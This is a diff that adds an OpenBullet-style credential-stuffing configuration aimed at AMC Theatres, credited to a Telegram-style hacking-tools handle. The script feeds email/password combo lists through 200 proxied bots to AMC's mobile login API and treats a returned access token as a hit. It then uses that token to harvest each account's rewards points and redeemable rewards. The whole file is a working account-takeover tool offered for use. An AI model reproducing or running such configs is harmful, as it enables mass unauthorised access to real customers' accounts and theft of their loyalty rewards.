@@ -1,0 +1,127 @@
+[SETTINGS]
+{
+  "Name": "AMC Theatres(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-08T10:32:50.5527833+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Uppercase",
+      "Id": 1302380256
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 1411046548
+    }
+  ],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<USER>" -> VAR "USERU" 
+
+FUNCTION RandomString "30c22553-?d?d?d?d-?d?d?dd-be8b-d9d?d?df233033" -> VAR "1" 
+
+FUNCTION Constant "3e1e6b58-b0ce-?dac?d-?d?d?df-a?d?d?d?d?d?de5b?d6" -> VAR "2" 
+
+FUNCTION Constant "b?d?df?dc16-d563-4fa8-?dd?d?d-?dde?dbfa?d?de?d?d" -> VAR "3" 
+
+#Post_Login REQUEST POST "https://deviceapi.amctheatres.com/api/token-v2" 
+  CONTENT "grant_type=password&username=<USERU>&password=<PASS>&client_id=A9EEBB05-2E8F-4129-A1A3-9D2DE8BAFD8C" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "X-AMC-Session-Id: <1>" 
+  HEADER "X-AMC-Transaction-Id: <2>" 
+  HEADER "X-AMC-Request-Id: <3>" 
+  HEADER "User-Agent: mobile-app" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: identity" 
+  HEADER "Content-Length: 130" 
+  HEADER "Host: deviceapi.amctheatres.com" 
+  HEADER "Connection: Keep-Alive" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "error\":\"canceled" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+#Token PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 
+
+#Rewards REQUEST GET "https://deviceapi.amctheatres.com/api/account/reward-summary" 
+  
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "api-version: 1" 
+  HEADER "X-AMC-Session-Id: <1>" 
+  HEADER "X-AMC-Transaction-Id: <2>" 
+  HEADER "X-AMC-Request-Id: <3>" 
+  HEADER "User-Agent: mobile-app" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: identity" 
+  HEADER "Host: deviceapi.amctheatres.com" 
+  HEADER "Connection: Keep-Alive" 
+
+#Points PARSE "<SOURCE>" JSON "pointBalance" CreateEmpty=FALSE -> CAP "Points" 
+
+#Pending_Points PARSE "<SOURCE>" JSON "pendingPoints" CreateEmpty=FALSE -> CAP "Pending Points" 
+
+#Next_Reward PARSE "<SOURCE>" JSON "pointsToNextReward" CreateEmpty=FALSE -> CAP "Points to Next Reward" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "pointBalance\":0" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "pointBalance\":0" 
+
+#Rewards PARSE "<SOURCE>" JSON "amount" Recursive=TRUE CreateEmpty=FALSE -> CAP "Reward Amount" 
+
+#Rewards_Type PARSE "<SOURCE>" JSON "rewardType" Recursive=TRUE CreateEmpty=FALSE -> CAP "Reward Type" 
+
+#Points_to_Redeem PARSE "<SOURCE>" JSON "pointsToRedeem" Recursive=TRUE CreateEmpty=FALSE -> CAP "Points to Redeem" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
